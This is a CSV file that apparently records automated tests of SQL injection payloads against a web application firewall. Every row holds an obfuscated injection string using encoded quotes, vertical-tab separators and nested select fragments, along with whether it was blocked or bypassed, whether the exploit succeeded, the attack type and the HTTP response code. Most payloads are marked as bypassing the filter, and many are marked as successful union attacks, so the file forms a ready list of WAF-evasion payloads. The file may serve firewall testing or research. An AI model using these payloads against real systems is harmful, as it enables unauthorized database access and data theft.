Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@!=1.+or+!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0067,73.5,No,403
0'<@!=1.+or%0bnot+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0118,73.5,No,500
0'<@!=1.+||+not%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0118,73.5,No,500
0%27<@=1%0bor%0b!+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0148,73.5,No,200
0'<@=.1+or+!+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0109,73.5,No,500
0'<@!=1.%0b||+not+{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.008,73.61,No,500
0%27<@!=1.+or%0b0=+(not~0),Bypassed,Yes,unionAtk,Unknown,0.0132,73.61,No,200
0'<@=1%0b||+!+1=+(!+,Bypassed,No,None,Unknown,0.0087,73.61,No,500
0%27<@=1.+||%0bnot%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0187,73.61,No,200
0%27<@=1.+or+not+1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0175,73.61,No,200
0%27<@=.1+||+!%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.024,73.61,No,200
0'<@!=.1%0bor+not+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0217,73.61,No,500
0%27<@=.1%0b||+{`if`%0b1}=1%0blike+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0155,73.61,No,200
0'<@!=.1%0b||%0bnot%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0233,73.61,No,500
0%27or+1<@.%0bor+not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.011,73.61,No,403
0%27<@=.1+or+!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0227,73.5,No,200
0'<@=.1+or%0b!%7efalse=%0b(not+,Blocked,No,None,booleanAtk,0.0106,73.5,No,403
0%27<@=1.%0b||+!%0b{x+(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0194,73.5,No,200
0'<@=1.+||%0b0=%0b(not%0b{x,Bypassed,No,None,Unknown,0.018,73.5,No,500
0'<@=.1%0b||+not%0btrue=%0b(!%0b,Bypassed,No,None,Unknown,0.0167,73.5,No,500
0%27<@=1.%0b||%0bnot+{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0116,73.5,No,200
0%27<@!=.1+||+!%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0189,73.5,No,200
0%27<@=1.+or%0b!%0b1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0286,73.5,No,200
0%27<@!=1.%0bor%0bnot~false=%0b(!+,Bypassed,Yes,unionAtk,booleanAtk,0.0285,73.5,No,200
0%27<@!=.1+||+{x%0b(select+1)}=1%0blike%0btrue,Bypassed,Yes,unionAtk,Unknown,0.0139,73.5,No,200
0'<@=.1%0bor+not+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0245,73.5,No,500
0%27<@=1.+or+not+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0112,73.5,No,200
0%27<@=1%0bor%0b!+{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0109,73.5,No,200
0%27<@!=1+or+!%0b1=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0174,73.5,No,200
0%27<@!=1+or+not~false=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0296,73.5,No,200
0%27<@!=.1%0bor+not%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.019,73.5,No,200
0'<@!=.1%0b||%0b!%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0228,73.5,No,500
0%27<@!=.1+or%0bnot%0b{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0198,73.5,No,200
0'<@=1+or%0bnot+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.011,73.5,No,403
0%27<@=.1+or%0bnot%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0198,73.5,No,200
0'<@!=1.+or+!%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0206,73.5,No,500
0'<@!=1%0b||+not%7e0=%0b(not,Bypassed,No,None,Unknown,0.0142,73.5,No,500
0'<@!=1+or+!%0b{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0216,73.5,No,500
0'<@!=1+||+!%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0144,73.5,No,500
0%27<@!=.1+or+not%0b1=%0b(not%7e,Bypassed,Yes,unionAtk,Unknown,0.0209,73.5,No,200
0'<@=.1%0b||%0b!%0btrue=%0b(not+,Bypassed,No,None,Unknown,0.0165,73.5,No,500
0%27<@=1.+||+not%0b{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0187,73.5,No,200
0'<@=1%0bor+not%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0161,73.5,No,500
0%27<@=1.+||%0b!+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0154,73.5,No,200
0'<@=.1%0b||+!%7e0=%0b(not+,Bypassed,No,None,Unknown,0.009,73.5,No,500
0%27<@!=1.+||+!%0b{x+(select+1)}=1%0bis,Bypassed,Yes,unionAtk,Unknown,0.0216,73.5,No,200
0%27<@=1%0b||+false=+(not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0088,73.5,No,200
0%27<@!=1.+||+not%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0146,73.5,No,200
0%27<@=1.%0bor+not+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,73.5,No,200
0%27<@!=1%0b||+not%0b1=%0b(false),Bypassed,Yes,unionAtk,Unknown,0.0148,73.5,No,200
0%27<@=1+||%0bnot+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0139,73.61,No,200
0'<@!=1.%0bor%0b{x+(select+1)}=1+like+{x,Bypassed,No,None,Unknown,0.0105,73.61,No,500
0'<@!=.1+||+{x%0b(select%0b1)}=1%0blike%0btrue,Blocked,No,None,Unknown,0.0093,73.61,No,403
0'<@=.1%0bor%0b!%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0239,73.61,No,500
0'<@!=1.+||+{a+1}=1%0blike%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.0146,73.61,No,500
0'<@!=1.+||%0bnot+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0161,73.61,No,500
0'<@=.1%0bor+!+{x%0b(select+1)}=1=,Bypassed,No,None,Unknown,0.0127,73.61,No,500
0%27<@!=.1%0bor+{`if`+1}=1+like+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0179,73.61,No,200
0'<@!=.1%0bor+{a+1}=1+like%0b{x%0b(select,Bypassed,No,None,Unknown,0.0234,73.61,No,500
0%27<@=1.%0b||+not%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0195,73.61,No,200
0%27<@!=.1%0b||%0b!+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.025,73.61,No,200
0'<@!=.1%0bor%0b!%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.0159,73.61,No,500
0%27<@!=1%0bor+0=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0139,73.61,No,200
0'<@=.1%0b||%0b!+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0309,73.61,No,500
0%27<@!=1%0bor+!+{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0225,73.61,No,200
0%27<@!=1+||+!%7efalse=+(!,Bypassed,Yes,unionAtk,Unknown,0.0366,73.5,No,200
0'<@!=1.+or%0bnot+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0177,73.5,No,500
0%27<@!=.1%0bor%0b!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0214,73.5,No,200
0'<@=1+||%0bnot+true=+(false,Bypassed,No,None,Unknown,0.0167,73.5,No,500
0%27<@!=1+||+not+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.015,73.5,No,200
0'<@!=1+||+not%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0148,73.5,No,500
0'<@=1.+or+!%0b{x+(select%0b1)}=1=,Bypassed,No,None,Unknown,0.0086,73.5,No,500
0'||%0b1<@+or+!%0b{x+(select+1)}=1,Blocked,No,None,Unknown,0.0185,73.5,No,403
0'<@=.1%0b||%0b!+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0208,73.5,No,500
0'<@=1+||+not%0b{`if`%0b1}=1+is+,Bypassed,No,None,Unknown,0.0174,73.5,No,500
0'<@=1.+||%0bnot%0b1=%0b(not%7e,Bypassed,No,None,Unknown,0.0309,73.5,No,500
0%27<@=1.+or%0b!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0183,73.5,No,200
0'<@!=.1%0b||%0bnot%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0237,73.5,No,500
0%27<@!=.1+or+!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0196,73.5,No,200
0%27<@!=1+or+false=+(!%0b{x,Bypassed,Yes,unionAtk,booleanAtk,0.0155,73.5,No,200
0%27<@!=.1+or+!%0b{x+(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.021,73.5,No,200
0'<@!=1%0bor+!~0=%0b(!%7e,Bypassed,No,None,Unknown,0.0176,73.5,No,500
0%27<@=1%0bor%0bnot~0=+(not~,Bypassed,Yes,unionAtk,Unknown,0.0189,73.5,No,200
0%27<@!=.1%0b||+!%7efalse=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0186,73.5,No,200
0'<@=1%0b||%0bnot%7efalse=+(!+,Bypassed,No,None,Unknown,0.0145,73.5,No,500
0'or%0b1<@.%0b||+{a+1}=1+like+{x,Bypassed,No,None,Unknown,0.0233,73.5,No,500
0'<@!=1+or+1+like+{a%0b1}=1--+,Bypassed,No,None,piggyAtk,0.0106,73.5,No,500
0'<@!=1.%0bor%0bnot%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0147,73.5,No,500
0'<@=1%0bor%0bnot%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0124,73.5,No,500
0'<@=1.+or%0b!%0b{`if`+1}=1+is+,Bypassed,No,None,Unknown,0.0233,73.5,No,500
0%27<@=1.%0b||+not+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0174,73.5,No,200
0'<@!=1%0b||+!%7efalse=%0b(not,Bypassed,No,None,Unknown,0.0124,73.5,No,500
0%27<@=.1%0bor%0b!~0=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.017,73.5,No,200
0'or+@<@.%0b||%0bnot%0b{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.009,73.5,No,500
0'<@!=.1%0bor%0bnot+{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.011,73.5,No,500
0%27<@!=1+||+not+1=%0b(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,73.5,No,200
0'<@!=.1+or+!%0btrue=+(not+,Bypassed,No,None,booleanAtk,0.0133,73.55,No,500
0%27<@=1.+||%0bnot%0b1=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0177,73.61,No,200
0%27<@!=1%0b||+!%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0176,73.61,No,200
0%27<@=1.+||+!+true=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0107,73.61,No,200
0'<@!=1%0b||%0bnot%0b{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0128,73.61,No,500
0'<@!=1.+||+true%0blike%0btrue%0bor%27,Bypassed,No,None,booleanAtk,0.0239,73.61,No,500
0'<@=1.%0b||+not+true=%0b(not%0b,Bypassed,No,None,Unknown,0.0172,73.61,No,500
0'<@!=.1+or%0bnot%0b{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0207,73.61,No,500
0'<@!=.1+||+not%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0102,73.61,No,500
0'<@!=1.+or+!+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0085,73.61,No,500
0'<@=1.%0bor+0=+(not+{x,Bypassed,No,None,Unknown,0.0199,73.61,No,500
0'<@=1.%0bor+not+1=%0b(!,Bypassed,No,None,Unknown,0.015,73.61,No,500
0'<@=1.%0b||+not%0btrue=%0b(!%0b,Bypassed,No,None,Unknown,0.0168,73.61,No,500
0'<@=1.%0b||+not%0btrue=+(!%0b,Bypassed,No,None,Unknown,0.0135,73.61,No,500
0%27<@=.1+or+!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.022,73.61,No,200
0%27<@!=.1%0bor%0bnot+true=+(not,Bypassed,Yes,unionAtk,booleanAtk,0.0208,73.61,No,200
0%27<@!=1.+||+!%0b{x+(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0261,73.61,No,200
0'<@!=1.%0b||+not%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0276,73.61,No,500
0%27or+!@<@%0bor+not+{a%0b1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0251,73.61,No,200
0'<@=1.+or+not+{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0173,73.5,No,500
0%27<@=.1+or+!+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0075,73.5,No,200
0'<@!=1+||+false=%0b(not%0b{`if`,Bypassed,No,None,Unknown,0.0275,73.5,No,500
0'<@=.1+||%0b{x+(select%0b1)}=1+like+true,Bypassed,No,None,Unknown,0.0162,73.5,No,500
0%27<@=.1+or%0bnot+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0182,73.5,No,200
0%27<@=1.%0b||+not+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0205,73.5,No,200
0'<@!=1.+||%0bnot+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0135,73.5,No,403
0'<@!=1%0bor+!+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0202,73.5,No,500
0'<@=1.%0b||%0bnot%7e0%0bis+false+,Bypassed,No,None,Unknown,0.0152,73.5,No,500
0%27<@!=1%0b||%0bnot+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0132,73.5,No,200
0'<@!=1.%0bor+not+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0207,73.5,No,500
0%27<@=.1+or%0bnot%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0235,73.5,No,200
0%27||%0b1<@.+||+not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0274,73.5,No,403
0%27<@!=1+||+false=%0b(!%7e0),Bypassed,Yes,unionAtk,Unknown,0.0186,73.5,No,200
0%27<@=1+or+not%0b{x+(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.024,73.5,No,200
0'<@=.1%0b||+not~0=+(not,Bypassed,No,None,Unknown,0.008,73.5,No,500
0%27<@=.1%0b||+not+1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0347,73.5,No,200
0%27<@=1.+||%0b{a+1}=1%0blike+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0159,73.5,No,200
0'<@!=1.+||+not%7e0=+(not,Bypassed,No,None,Unknown,0.017,73.5,No,500
0%27<@!=1%0b||+!+{x+(select+1)}=1+,Bypassed,Yes,unionAtk,Unknown,0.0132,73.5,No,200
0'<@=1+or%0b0=+(!+{`if`,Bypassed,No,None,Unknown,0.022,73.5,No,500
0'<@=1%0bor+!+true=+(not%0b,Bypassed,No,None,booleanAtk,0.0101,73.5,No,500
0%27<@!=1%0bor%0b!%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0228,73.5,No,200
0%27<@=.1%0bor+!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0121,73.5,No,200
0'<@!=.1+||+not+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0195,73.5,No,403
0%27<@!=1%0b||+!%0b{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0164,73.5,No,200
0'<@=1+or%0bnot%0b{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0143,73.5,No,403
0'<@!=.1+||%0bnot+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0112,73.5,No,500
0%27<@=.1+||%0b!%0b1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0115,73.5,No,200
0%27<@!=.1+||%0bnot+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0144,73.5,No,200
0%27<@=1.+||%0b!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0125,73.5,No,200
0'<@=.1%0b||+not%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0159,73.5,No,500
0'<@!=.1+or+!%0b{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.014,73.61,No,500
0'<@!=.1+||+not+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0169,73.61,No,403
0%27<@=.1%0b||+!+true=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0227,73.61,No,200
0'<@=.1+or%0b!+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0028,73.61,No,403
0'<@!=1+or+!+{x%0b(select+1)}=1=,Bypassed,No,None,Unknown,0.0202,73.61,No,500
0%27<@=1.%0bor+not%0b{x+(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0132,73.61,No,200
0'<@!=1.+||+!%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0338,73.61,No,500
0'<@!=.1+||+not%0b{x%0b(select+1)}=1=,Bypassed,No,None,Unknown,0.0226,73.61,No,500
0%27<@!=1.%0bor%0bnot%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0172,73.61,No,200
0%27<@!=.1+or%0b!%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0209,73.61,No,200
0'<@!=1+or%0bnot+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0196,73.61,No,500
0%27<@!=1.%0b||+not%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0213,73.61,No,200
0%27<@=1+or+not~false=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0086,73.61,No,200
0'<@=1+||%0b{`if`%0b1}=1%0blike%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.0139,73.61,No,500
0'<@=1.+||%0bnot%0b{x%0b(select+1)}=1=+,Blocked,No,None,Unknown,0.0123,73.61,No,403
0%27<@!=.1+or+{x+(select%0b1)}=1%0blike%0b{x,Blocked,No,None,Unknown,0.0152,73.61,No,403
0'<@=.1+||+!%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0127,73.61,No,500
0%27<@!=1.+or+!%7efalse=+(!,Bypassed,Yes,unionAtk,booleanAtk,0.014,73.61,No,200
0'<@!=1+or+!+{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0362,73.5,No,500
0'<@!=.1+||+not%0b1=+(!%0b,Bypassed,No,None,Unknown,0.0129,73.5,No,500
0'<@!=.1%0b||+!%0btrue=%0b(not+,Bypassed,No,None,Unknown,0.0213,73.5,No,500
0'<@=1.+||+!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0191,73.5,No,403
0%27<@!=1%0b||%0bnot+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0182,73.5,No,200
0%27or+!@<@+||+!%0b{a+1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0187,73.5,No,200
0%27<@!=1.%0b||+not+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0167,73.5,No,200
0'<@!=1.+||+not%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0168,73.5,No,500
0%27<@!=.1%0b||%0bnot%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0283,73.5,No,200
0%27<@=1%0b||%0bnot+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0212,73.5,No,200
0'<@=.1+or%0bnot%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.016,73.5,No,500
0'<@!=1.%0bor+not+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0156,73.5,No,500
0'<@=1.+or+not+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0135,73.5,No,500
0'<@!=1.+||+{x%0b(select%0b1)}=1%0blike%0b1,Blocked,No,None,Unknown,0.0151,73.5,No,403
0%27<@!=.1+or+!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.009,73.5,No,403
0%27<@!=.1+or%0bnot%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0198,73.5,No,200
0'<@=1.%0b||+not+true=%0b(not+,Bypassed,No,None,Unknown,0.0179,73.5,No,500
0'<@=1.+||+not+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0128,73.5,No,500
0'<@!=1%0bor%0bnot%0b1+is+false%0b,Bypassed,No,None,booleanAtk,0.0142,73.5,No,500
0'<@!=.1+or+not+1=+(not%0b,Bypassed,No,None,Unknown,0.0132,73.5,No,500
0'<@!=1+||+not%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0183,73.5,No,500
0'<@!=.1%0bor+not+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0145,73.5,No,500
0'<@=1+or+not%0b{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.024,73.5,No,500
0%27<@=.1%0b||+not+{x+(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0214,73.5,No,200
0%27<@=1%0bor+not%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.017,73.5,No,200
0%27<@=.1+or%0b{x%0b(select+1)}=1+like+{x,Bypassed,Yes,unionAtk,Unknown,0.0113,73.5,No,200
0'<@=.1+or%0b!%0btrue=+(not+,Blocked,No,None,booleanAtk,0.0056,73.5,No,403
0'<@=1.+or%0b!+true=+(!%0b,Bypassed,No,None,booleanAtk,0.0116,73.5,No,500
0%27<@=1+||+!+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0117,73.5,No,200
0%27<@!=1+or%0bnot%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0115,73.5,No,200
0%27<@!=.1%0bor+not+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0118,73.5,No,200
0%27<@!=1.+||+!+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.016,73.5,No,200
0%27<@=1.%0b||%0bnot+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0129,73.61,No,200
0%27||+@<@.+or%0bnot%0b{`if`+1}=1=,Bypassed,Yes,unionAtk,Unknown,0.011,73.61,No,200
0%27<@!=1%0bor+!%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0145,73.61,No,200
0%27<@=1%0bor%0b1%0blike%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0095,73.61,No,200
0%27<@!=1+or+not%0b{x+(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0188,73.61,No,200
0'<@!=1.+or%0b!+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0153,73.61,No,500
0%27<@!=.1+or%0b!+true=%0b(not%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0209,73.61,No,200
0'<@=1.+or%0bnot+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0111,73.61,No,500
0%27<@!=.1+or+!+{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0195,73.61,No,200
0'<@!=.1+||+not+{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.013,73.61,No,500
0'<@!=1+or%0bnot+true=+(!+,Bypassed,No,None,booleanAtk,0.018,73.61,No,500
0'<@=1.+||%0bnot%0btrue=+(not+,Blocked,No,None,Unknown,0.0162,73.61,No,403
0%27<@=.1%0b||+not+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0187,73.61,No,200
0'<@!=1+||+not+{a+1}=1=+(,Bypassed,No,None,Unknown,0.016,73.61,No,500
0'<@!=1.+||+!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0113,73.61,No,403
0'<@=.1+or%0bnot~false=+(not%0b,Bypassed,No,None,booleanAtk,0.0167,73.61,No,500
0'<@!=1+or+not+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.016,73.61,No,403
0'<@!=1%0bor%0bnot%0b1=%0b(not,Bypassed,No,None,Unknown,0.0178,73.61,No,500
0%27<@=1%0b||%0bnot+{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.016,73.5,No,200
0'<@=.1+or%0b{a+1}=1%0blike%0b{`if`%0b1}=1,Bypassed,No,None,Unknown,0.0159,73.5,No,500
0%27<@!=1.%0b||+!%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0127,73.5,No,200
0%27<@!=.1+||+{x+(select%0b1)}=1+like+{a,Blocked,No,None,Unknown,0.0188,73.5,No,403
0'<@!=1.%0b||+!+{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0222,73.5,No,500
0'<@!=1+or%0b!+{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0118,73.5,No,500
0'<@=.1%0bor+!+{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0218,73.5,No,500
0%27<@!=.1+||+not%0b1=%0b(!~,Bypassed,Yes,unionAtk,Unknown,0.0169,73.5,No,200
0'<@=.1+or%0bnot%0b{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0173,73.5,No,403
0'<@!=1.+||%0b{x+(select+1)}=1%0blike+{x,Bypassed,No,None,Unknown,0.0176,73.5,No,500
0'<@!=1%0bor%0b!+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.017,73.5,No,500
0%27<@=1%0b||%0bnot%0b{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0146,73.5,No,200
0%27<@=1+||%0bnot+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0255,73.5,No,200
0%27<@!=1.%0bor+!%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0178,73.5,No,200
0'<@=1%0b||%0bnot%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.016,73.5,No,500
0'<@=1+||%0bnot+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0076,73.5,No,403
0'<@=1.%0b||+!+true=%0b(!+,Bypassed,No,None,Unknown,0.0129,73.5,No,500
0%27<@=.1+||+!+{x+(select+1)}=1%0bis,Blocked,No,None,Unknown,0.0148,73.5,No,403
0%27<@=1.%0bor+not%0b{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0171,73.5,No,200
